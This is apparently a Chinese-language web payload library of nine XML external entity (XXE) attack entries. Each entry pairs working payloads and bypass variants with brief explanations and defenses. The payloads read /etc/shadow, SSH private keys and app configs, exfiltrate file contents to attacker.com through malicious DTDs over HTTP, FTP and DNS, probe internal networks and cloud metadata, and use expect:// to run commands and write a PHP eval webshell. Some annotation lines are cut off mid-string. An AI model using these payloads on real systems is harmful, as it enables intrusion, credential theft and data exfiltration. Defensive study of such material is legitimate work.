# XXE实体注入

_9 条 web payload_

### XXE基础攻击  `xxe-basic`
_XML外部实体注入基础攻击技术_
子类：**基础攻击** · tags: `xxe` `xml` `external` `entity`

**前置条件：**
- 存在XML解析功能
- 外部实体未被禁用

**攻击链：**

**1. 探测XXE**
> 基础XXE测试
```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```
**语法解析：**
- `DOCTYPE` — 文档类型声明 _value_
- `ENTITY` — 定义实体 _value_
- `SYSTEM` — 引用外部资源 _value_
- `&xxe;` — 引用实体 _value_

**2. 读取文件**
> 读取Windows文件
_platform: windows_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>
```
**语法解析：**
- `file://` — 文件协议 _method_
- `<!DOCTYPE>` — 文档类型声明 _tag_
- `<!ENTITY>` — 实体定义 _tag_
- `SYSTEM` — 外部实体引用 _keyword_

**3. 读取PHP源码**
> 使用PHP Filter读取源码
```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>&xxe;</root>
```
**语法解析：**
- `php://filter` — PHP伪协议 _value_
- `convert.base64-encode` — Base64编码 _value_

**4. SSRF攻击**
> 利用XXE进行SSRF
```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```
**语法解析：**
- `169.254.169.254` — 云元数据IP _domain_
- `<!DOCTYPE>` — 文档类型声明 _tag_
- `<!ENTITY>` — 实体定义 _tag_
- `SYSTEM` — 外部实体引用 _keyword_

**WAF/EDR 绕过变体：**

**参数实体**
> 使用参数实体绕过
```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```
**语法解析：**
- `%` — 参数实体引用符 _operator_
- `%xxe;` — 引用参数实体 _variable_

**编码绕过**
> 使用编码绕过
```
<?xml version="1.0" encoding="UTF-16"?>
使用不同编码绕过WAF
```
**语法解析：**
- `<?xml` — 命令/关键字 _command_


**概述：** XXE(XML External Entity)注入利用XML解析器处理外部实体引用的特性，通过定义恶意实体引用来读取服务器文件、发起SSRF请求、甚至在特定环境下执行远程代码。

**漏洞原理：** XXE漏洞源于XML解析器默认启用外部实体处理。攻击者在XML输入中声明SYSTEM或PUBLIC实体指向本地文件(file://)或网络资源(http://)，解析器会自动获取并替换实体内容，导致文件读取和SSRF等危害。

**利用方法：** 完整利用流程：
1. 找到XML输入点
2. 注入外部实体声明
3. 读取敏感文件
4. 或发起SSRF攻击

**防御措施：** 防御措施：
1. 禁用外部实体处理
2. 禁用DTD处理
3. 使用安全的XML解析配置
4. 输入验证

---

### 盲注XXE攻击  `xxe-blind`
_无回显的XXE攻击技术_
子类：**盲注XXE** · tags: `xxe` `blind` `oob` `xml`

**前置条件：**
- 存在XML解析
- 无直接回显

**攻击链：**

**1. 外部实体探测**
> 使用外部实体探测
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://attacker.com/xxe">
]>
<foo>&xxe;</foo>
```
**语法解析：**
- `DOCTYPE` — 文档类型声明 _value_
- `ENTITY` — 定义实体 _value_
- `SYSTEM` — 外部系统资源 _value_
- `&xxe;` — 引用实体 _value_

**2. 参数实体**
> 使用参数实体
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
%xxe;
]>
<foo>test</foo>
```
**语法解析：**
- `%` — 参数实体标识符 _operator_
- `%xxe;` — 引用参数实体 _variable_

**3. OOB外带数据**
> OOB外带文件内容
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
%xxe;
]>
<foo>test</foo>

# xxe.dtd内容
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```
**语法解析：**
- `file://` — 文件协议 _method_
- `<!DOCTYPE>` — 文档类型声明 _tag_
- `<!ENTITY>` — 实体定义 _tag_
- `SYSTEM` — 外部实体引用 _keyword_
- `/etc/passwd` — 敏感文件路径 _path_
- `&#xx;` — HTML实体编码 _encoding_

**WAF/EDR 绕过变体：**

**编码绕过**
> 编码绕过
```
使用UTF-16编码XML文档
绕过WAF检测
```
**语法解析：**
- `使用UTF-16编码XML文档
绕过WAF检测` — 攻击载荷 _value_


**概述：** Blind XXE是指XML外部实体注入成功但响应中不直接显示实体内容的场景，需要通过带外(OOB)数据外泄技术将读取的文件内容通过HTTP/DNS等方式发送到攻击者控制的服务器。

**漏洞原理：** Blind XXE利用参数实体(%entity)和外部DTD实现数据外泄：在外部DTD中定义嵌套实体引用，将文件内容拼接到HTTP请求URL中发送到攻击者服务器。部分XML解析器限制了实体嵌套，需使用不同的外泄策略。

**利用方法：** 完整利用流程：
1. 确认XXE存在
2. 使用参数实体
3. 构造OOB外带
4. 获取敏感数据

**防御措施：** 防御Blind XXE：禁用XML外部实体和DTD处理(最有效)，使用JSON代替XML格式，配置网络层出站流量白名单阻止OOB数据外泄，部署WAF检测DTD声明和实体引用，监控DNS/HTTP异常外联请求。

---

### XXE OOB外带攻击  `xxe-oob`
_利用OOB技术外带XXE数据_
子类：**OOB外带** · tags: `xxe` `oob` `exfiltration` `xml`

**前置条件：**
- 存在XXE漏洞
- 可发起外部请求

**攻击链：**

**1. HTTP外带**
> HTTP外带数据
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<foo></foo>

# evil.dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/log?data=%file;'>">
%eval;
%exfil;
```
**语法解析：**
- `<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">` — 参数实体引用远程恶意DTD文件 _command_
- `%xxe;` — 在DTD中展开参数实体，加载远程DTD _operator_
- `<!ENTITY % file SYSTEM "file:///etc/passwd">` — 在DTD中读取目标服务器本地文件 _value_
- `http://attacker.com/log?data=%file;` — 通过HTTP请求参数将文件内容外带 _value_

**2. FTP外带**
> FTP外带数据
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<foo></foo>

# evil.dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com/%file;'>">
%eval;
%exfil;
```
**语法解析：**
- `ftp://attacker.com/%file;` — 使用FTP协议外带数据，支持多行内容 _command_
- `%eval;` — 展开eval参数实体，动态构造外带实体 _operator_
- `%exfil;` — 触发外带请求，将数据发送到攻击者FTP服务器 _operator_

**3. DNS外带**
> DNS外带
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://attacker.com/log?file=/etc/passwd">
]>
<foo>&xxe;</foo>

# 或使用子域名
<!ENTITY xxe SYSTEM "http://filecontent.attacker.com/">
```
**语法解析：**
- `http://filecontent.attacker.com/` — 将文件内容作为子域名通过DNS解析外带 _value_
- `&xxe;` — 在XML内容中引用通用实体触发请求 _operator_

**WAF/EDR 绕过变体：**

**使用CDATA**
> CDATA包装
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo><![CDATA[&xxe;]]></foo>
```
**语法解析：**
- `<![CDATA[` — XML CDATA段开始标记，内容不被XML解析器处理 _operator_
- `&xxe;` — 实体引用在CDATA之前被解析展开 _variable_
- `]]>` — CDATA段结束标记 _operator_


**概述：** XXE OOB(Out-of-Band)带外数据外泄是Blind XXE的核心利用技术，通过HTTP/FTP/DNS等外部通道将服务器内部数据传输到攻击者，是XXE漏洞从检测到实际数据提取的关键步骤。

**漏洞原理：** XXE OOB通过多层参数实体嵌套实现：1)第一个实体读取目标文件 2)第二个实体(外部DTD)将文件内容拼接进HTTP URL 3)解析器请求该URL将数据发送到攻击者。FTP协议可外泄多行内容，DNS可在严格网络环境下作为隐蔽通道。

**利用方法：** 完整利用流程：
1. 托管恶意DTD文件
2. 构造XXE payload
3. 触发外带请求
4. 接收并解析数据

**防御措施：** 防御XXE OOB：完全禁用外部实体处理和DTD加载，配置严格的出站网络策略(仅允许必要的白名单出站)，监控异常DNS查询和HTTP外联请求，使用RASP检测XML解析中的文件访问和网络请求行为。

---

### XXE+SSRF组合攻击  `xxe-ssrf`
_利用XXE实现SSRF攻击_
子类：**XXE+SSRF** · tags: `xxe` `ssrf` `combination` `xml`

**前置条件：**
- 存在XXE漏洞
- 内网可访问

**攻击链：**

**1. 扫描内网端口**
> 扫描内网端口
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://192.168.1.1:22">
]>
<foo>&xxe;</foo>

# 批量扫描
<!ENTITY xxe SYSTEM "http://192.168.1.1:80">
<!ENTITY xxe SYSTEM "http://192.168.1.1:443">
```
**语法解析：**
- `<!ENTITY xxe SYSTEM` — 定义外部通用实体，支持多种协议 _command_
- `"http://192.168.1.1:22"` — 目标内网IP和端口，通过响应差异判断端口状态 _value_
- `&xxe;` — 在XML内容中引用实体触发HTTP请求 _operator_

**2. 访问内网服务**
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/info">
]>
<foo>&xxe;</foo>

# 访问Redis
# 访问内部API
```
**语法解析：**
- `127.0.0.1` — 本地回环 _domain_
- `<!DOCTYPE>` — 文档类型声明 _tag_
- `<!ENTITY>` — 实体定义 _tag_
- `SYSTEM` — 外部实体引用 _keyword_

**WAF/EDR 绕过变体：**

**编码绕过**
> 编码绕过
```
使用不同编码格式绕过IP过滤
```
**语法解析：**
- `IP编码` — 使用十进制(2130706433)、十六进制(0x7f000001)、八进制(0177.0.0.1)绕过 _command_
- `URL编码` — 对URL进行单次或双重URL编码绕过过滤 _parameter_


**概述：** XXE SSRF利用XML外部实体发起服务端请求，可探测和访问内网服务、云元数据API、本地端口等，将XXE漏洞的影响范围从XML解析器所在服务器扩展到整个内网环境。

**漏洞原理：** XXE SSRF通过SYSTEM实体引用内网URL：<!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">获取云元数据、http://internal-service:8080/admin访问内网管理接口、http://127.0.0.1:port/进行端口扫描等。

**利用方法：** 完整利用流程：
1. 发现XXE漏洞
2. 构造SSRF payload
3. 访问内网服务
4. 获取敏感信息

**防御措施：** 防御XXE SSRF：禁用外部实体处理，配置网络分段限制XML解析服务器的网络访问范围，阻止对元数据服务(169.254.169.254)的请求，启用IMDSv2(AWS)要求Token认证，监控异常内网HTTP请求。

---

### XXE到RCE  `xxe-rce`
_利用XXE实现远程代码执行_
子类：**XXE到RCE** · tags: `xxe` `rce` `php` `expect`

**前置条件：**
- 存在XXE漏洞
- PHP expect扩展加载

**攻击链：**

**1. Expect扩展RCE**
> 使用expect协议执行命令
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "expect://whoami">
]>
<foo>&xxe;</foo>

# 执行任意命令
<!ENTITY xxe SYSTEM "expect://id">
<!ENTITY xxe SYSTEM "expect://cat /etc/passwd">
```
**语法解析：**
- `expect://` — PHP expect协议 _value_
- `whoami` — 要执行的命令 _command_

**2. 写入WebShell**
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "expect://echo '<?php eval($_POST[cmd]);?>' > /var/www/html/shell.php">
]>
<foo>&xxe;</foo>
```
**语法解析：**
- `<!DOCTYPE>` — 文档类型声明 _tag_
- `<!ENTITY>` — 实体定义 _tag_
- `SYSTEM` — 外部实体引用 _keyword_

**WAF/EDR 绕过变体：**

**编码绕过**
> 编码绕过
```
使用Base64或其他编码绕过命令过滤
```
**语法解析：**
- `使用Base64或其他编码绕过命令过滤` — 攻击载荷 _value_


**概述：** XXE远程代码执行在特定环境下可实现：PHP的expect://协议直接执行命令、通过XXE写入WebShell文件、利用XXE SSRF攻击内网服务(如Redis)间接RCE，以及通过Java反序列化与XXE组合攻击。

**漏洞原理：** XXE RCE利用路径：1)PHP expect://包装器(<!ENTITY rce SYSTEM "expect://whoami">) 2)结合文件上传写入WebShell 3)XXE SSRF→gopher://攻击内网Redis/MySQL实现RCE 4)Java环境下XXE触发反序列化漏洞。

**利用方法：** 完整利用流程：
1. 确认expect扩展可用
2. 构造expect协议payload
3. 执行系统命令
4. 获取Shell

**防御措施：** 防御XXE RCE：禁用外部实体和所有PHP流包装器，删除不必要的PHP扩展(如expect)，严格的文件系统权限防止写入Web目录，网络隔离限制XML解析服务器的网络访问，定期更新XML解析库版本。

---

### XXE文件读取  `xxe-file-read`
_利用XXE读取服务器文件_
子类：**文件读取** · tags: `xxe` `file` `read` `lfi`

**前置条件：**
- 存在XXE漏洞
- 有文件读取权限

**攻击链：**

**1. 读取Linux文件**
> 读取Linux系统文件
_platform: linux_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

# 其他敏感文件
file:///etc/shadow
file:///etc/hosts
file:///root/.ssh/id_rsa
file:///proc/self/environ
```
**语法解析：**
- `file://` — 本地文件协议 _value_
- `/etc/passwd` — 用户信息文件 _path_

**2. 读取Windows文件**
> 读取Windows系统文件
_platform: windows_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<foo>&xxe;</foo>

# 其他敏感文件
file:///c:/windows/system32/config/sam
file:///c:/users/administrator/.ssh/id_rsa
```
**语法解析：**
- `<?xml version="1.0"?>` — XML声明/实体定义 _tag_
- `<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">` — XML声明/实体定义 _tag_
- `
]>
<foo>&xxe;</foo>

# 其他敏感文件
file:///c:/windows/syste` — XML内容 _value_

**3. 读取Web配置**
> 读取Web应用配置
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
]>
<foo>&xxe;</foo>

# 常见配置文件
file:///var/www/html/wp-config.php
file:///app/.env
file:///app/config/database.yml
```
**语法解析：**
- `<?xml version="1.0"?>` — XML声明/实体定义 _tag_
- `<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">` — XML声明/实体定义 _tag_
- `
]>
<foo>&xxe;</foo>

# 常见配置文件
file:///var/www/html/wp-` — XML内容 _value_

**4. 读取源代码**
> 使用PHP Filter读取源码
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
]>
<foo>&xxe;</foo>
```
**语法解析：**
- `<?xml version="1.0"?>` — XML声明/实体定义 _tag_
- `<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resourc` — XML声明/实体定义 _tag_
- `
]>
<foo>&xxe;</foo>` — XML内容 _value_

**WAF/EDR 绕过变体：**

**使用参数实体**
> 参数实体绕过
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY bar "%xxe;">
]>
<foo>&bar;</foo>
```
**语法解析：**
- `<?xml version="1.0"?>` — XML声明/实体定义 _tag_
- `<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">` — XML声明/实体定义 _tag_
- `<!ENTITY bar "%xxe;">` — XML声明/实体定义 _tag_
- `
]>
<foo>&bar;</foo>` — XML内容 _value_


**概述：** XXE文件读取是XXE漏洞最基础的利用方式，通过file://协议定义外部实体读取服务器本地文件。直接回显方式可在响应中看到文件内容，是XXE漏洞验证和信息收集的首要步骤。

**漏洞原理：** XXE文件读取使用file://协议：<!ENTITY file SYSTEM "file:///etc/passwd">。可读取的关键文件包括系统配置(/etc/passwd,/etc/hosts)、应用源码、数据库配置(含密码)、SSH密钥等。二进制文件需使用PHP的php://filter/base64进行编码读取。

**利用方法：** 完整利用流程：
1. 发现XXE漏洞
2. 构造文件读取payload
3. 读取敏感文件
4. 获取凭据信息

**防御措施：** 防御XXE文件读取：在XML解析器配置中禁用外部实体(如Java的setFeature DISALLOW_DOCTYPE)，使用安全的XML库(如defusedxml for Python)，最小化运行XML解析进程的系统权限，将敏感文件权限设为仅owner可读。

---

### XXE外部DTD利用  `xxe-dtd`
_利用外部DTD文件进行XXE攻击_
子类：**外部DTD** · tags: `xxe` `dtd` `external` `xml`

**前置条件：**
- 存在XXE漏洞
- 可访问外部DTD

**攻击链：**

**1. 托管恶意DTD**
> 创建恶意DTD文件
```
# 在攻击者服务器创建evil.dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```
**语法解析：**
- `<!ENTITY % file SYSTEM "file:///etc/passwd">` — 参数实体读取目标系统文件 _command_
- `&#x25;` — %的HTML实体编码，在实体定义中引用其他参数实体 _operator_
- `http://attacker.com/?d=%file;` — 通过HTTP请求参数外带文件内容 _value_

**2. 引用外部DTD**
> 引用外部DTD文件
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<foo>test</foo>
```
**语法解析：**
- `<!DOCTYPE foo [` — DTD声明块开始 _command_
- `<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">` — 定义参数实体指向远程恶意DTD文件 _command_
- `%xxe;` — 展开参数实体，加载并执行远程DTD中的定义 _operator_

**3. 多步骤外带**
> 处理特殊字符
```
# evil.dtd - 多步骤外带
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "%start;%file;%end;">
```
**语法解析：**
- `<![CDATA[` — CDATA开始标记，处理文件中的XML特殊字符 _operator_
- `%start;%file;%end;` — 拼接CDATA标记和文件内容，避免XML解析错误 _variable_
- `%all;` — 展开包含完整CDATA包裹数据的实体 _operator_

**4. 错误消息泄露**
> 错误消息外带
```
# 利用错误消息泄露数据
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;

# 错误消息中会包含文件内容
```
**语法解析：**
- `file://` — 文件协议 _method_
- `<!ENTITY>` — 实体定义 _tag_
- `SYSTEM` — 外部实体引用 _keyword_
- `/etc/passwd` — 敏感文件路径 _path_
- `&#xx;` — HTML实体编码 _encoding_

**WAF/EDR 绕过变体：**

**使用HTTPS**
> HTTPS绕过
```
使用HTTPS托管DTD文件绕过HTTP过滤
```
**语法解析：**
- `使用HTTPS托管DTD文件绕过HTTP过滤` — 命令/关键字 _command_


**概述：** XXE DTD攻击利用文档类型定义(DTD)中的实体声明功能，通过内部DTD或加载外部DTD文件来定义和利用恶意实体。外部DTD方式可绕过某些解析器对内部DTD中参数实体嵌套的限制。

**漏洞原理：** XXE DTD利用方式：1)内部DTD直接声明SYSTEM实体读取文件 2)外部DTD加载攻击者服务器上的恶意DTD文件 3)利用本地DTD文件重新定义实体(适用于禁止外部DTD加载的环境) 4)参数实体嵌套实现复杂的数据外泄操作。

**利用方法：** 完整利用流程：
1. 创建恶意DTD文件
2. 托管在攻击者服务器
3. 构造XXE引用DTD
4. 触发外带获取数据

**防御措施：** 防御XXE DTD：完全禁用DTD处理(disallow-doctype-decl=true)，禁止加载外部DTD文件，如必须使用DTD则仅允许特定的本地DTD，WAF检测并拦截包含DOCTYPE声明的XML请求，使用不支持DTD的轻量级XML解析模式。

---

### XLSX文件XXE  `xxe-xlsx`
_利用XLSX文件进行XXE攻击_
子类：**XLSX文件XXE** · tags: `xxe` `xlsx` `excel` `office`

**前置条件：**
- 应用解析XLSX文件
- 存在XXE漏洞

**攻击链：**

**1. 解压XLSX文件**
> 解压XLSX文件
```
# XLSX本质是ZIP文件
unzip spreadsheet.xlsx

# 主要文件结构
xl/workbook.xml
xl/worksheets/sheet1.xml
xl/sharedStrings.xml
[Content_Types].xml
```
**语法解析：**
- `unzip spreadsheet.xlsx` — XLSX是ZIP压缩包，直接解压获取内部XML文件 _command_
- `xl/workbook.xml` — 工作簿主配置文件，包含Sheet信息 _value_
- `xl/worksheets/sheet1.xml` — 工作表数据文件，包含单元格内容 _value_
- `[Content_Types].xml` — 内容类型定义文件，也可作为XXE注入点 _value_

**2. 注入XXE Payload**
```
# 修改xl/workbook.xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<workbook xmlns="...">
&xxe;
</workbook>
```
**语法解析：**
- `file://` — 文件协议 _method_
- `<!DOCTYPE>` — 文档类型声明 _tag_
- `<!ENTITY>` — 实体定义 _tag_
- `SYSTEM` — 外部实体引用 _keyword_
- `/etc/passwd` — 敏感文件路径 _path_

**WAF/EDR 绕过变体：**

**修改Content_Types**
> 修改Content_Types
```
修改[Content_Types].xml注入XXE
```
**语法解析：**
- `[Content_Types].xml` — XLSX中的内容类型定义文件，常被忽略 _value_
- `XXE注入` — 在此文件中注入XXE，绕过仅检查workbook.xml的WAF _command_


**概述：** XLSX文件本质上是ZIP压缩包内的多个XML文件，上传恶意XLSX文件可触发服务端XML解析器的XXE漏洞。Office文档处理、数据导入、报表系统等功能是常见的攻击入口。

**漏洞原理：** XLSX XXE利用步骤：将XLSX文件解压→在xl/workbook.xml或[Content_Types].xml等XML文件中注入XXE实体声明→重新压缩为XLSX→上传到目标系统。当服务端使用不安全的XML解析器处理XLSX时触发XXE读取文件或SSRF。

**利用方法：** 完整利用流程：
1. 解压XLSX文件
2. 注入XXE payload
3. 重新打包
4. 上传触发漏洞

**防御措施：** 防御XLSX XXE：使用安全配置的XML解析库处理Office文档，在解析前验证XLSX文件结构并剥离DTD声明，使用专用的Office文档处理库(如Apache POI配置禁用外部实体)，对上传文件进行沙箱解析。

---

### DOCX文件XXE  `xxe-docx`
_利用DOCX文件进行XXE攻击_
子类：**DOCX文件XXE** · tags: `xxe` `docx` `word` `office`

**前置条件：**
- 应用解析DOCX文件
- 存在XXE漏洞

**攻击链：**

**1. 解压DOCX文件**
> 解压DOCX文件
```
# DOCX本质是ZIP文件
unzip document.docx

# 主要文件结构
word/document.xml
word/_rels/document.xml.rels
[Content_Types].xml
```
**语法解析：**
- `unzip document.docx` — DOCX是ZIP压缩包，解压获取内部XML _command_
- `word/document.xml` — 主文档内容文件，核心注入点 _value_
- `word/_rels/document.xml.rels` — 文档关系文件，也可作为注入点 _value_
- `[Content_Types].xml` — 内容类型定义，备选注入点 _value_

**2. 注入XXE Payload**
```
# 修改word/document.xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document xmlns:w="...">
<w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
</w:document>
```
**语法解析：**
- `file://` — 文件协议 _method_
- `<!DOCTYPE>` — 文档类型声明 _tag_
- `<!ENTITY>` — 实体定义 _tag_
- `SYSTEM` — 外部实体引用 _keyword_
- `/etc/passwd` — 敏感文件路径 _path_

**WAF/EDR 绕过变体：**

**修改关系文件**
> 修改关系文件
```
修改_rels/.rels或document.xml.rels注入XXE
```
**语法解析：**
- `_rels/.rels` — DOCX根关系文件，定义文档各部分的关联 _value_
- `document.xml.rels` — 文档关系文件，常被WAF忽略的注入点 _value_
- `XXE注入` — 在关系文件中注入XXE实体绕过内容检测 _command_


**概述：** DOCX文件与XLSX类似是基于XML的Office Open XML格式，通过修改其中的XML文件注入XXE实体，可在文档处理系统(在线预览/格式转换/内容提取)中触发服务端XXE漏洞。

**漏洞原理：** DOCX XXE注入点包括：word/document.xml(主文档内容)、[Content_Types].xml(内容类型定义)、word/_rels/.rels(关系定义)等XML文件。在线文档预览服务、文件格式转换API、简历解析系统等都是高风险攻击面。

**利用方法：** 完整利用流程：
1. 解压DOCX文件
2. 注入XXE payload
3. 重新打包
4. 上传触发漏洞

**防御措施：** 防御DOCX XXE：与XLSX防御相同，使用安全配置的XML解析器，禁用外部实体，对用户上传的Office文档进行预处理(剥离DTD/实体声明)，在隔离环境中处理不可信文档，限制文档处理进程的网络和文件访问权限。

---
